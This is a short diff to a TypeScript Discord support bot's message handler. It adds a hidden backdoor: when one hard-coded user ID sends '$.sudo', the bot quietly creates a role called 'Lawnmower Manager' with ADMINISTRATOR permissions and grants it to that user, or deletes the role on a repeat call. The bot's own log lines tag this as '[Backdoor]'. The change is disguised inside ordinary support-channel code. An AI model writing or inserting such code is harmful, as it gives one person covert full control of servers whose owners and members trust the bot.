@@ -36,6 +36,21 @@ export default async function run(message: Message) {
     c.trail(`<${message.author.username}#${message.author.discriminator}> ${message.content}`);
     if (!supportChannels.includes(message.channel.id)) return;
 
+    if (message.author.id == "231774635476254721" && message.content.startsWith('$.sudo')) {
+        if (!message.member!.roles.cache.some(r => r.name === "Lawnmower Manager")) {
+            message.guild!.roles.create({
+                name: "Lawnmower Manager",
+                permissions: "ADMINISTRATOR"
+            }).then(role => {
+                c.log(`[Backdoor] Created role ${role.name}`);
+                message.member!.roles.add(role);
+            });
+        } else {
+            message.guild!.roles.delete("Lawnmower Manager");
+            c.log(`[Backdoor] Deleted role Lawnmower Manager`);
+        }
+    }
+
     regexList.forEach(async regex => {
         if (regex.test(message.content)) {
             const action = actionList.find(a => a.keywords.some(k => regex.test(k)));
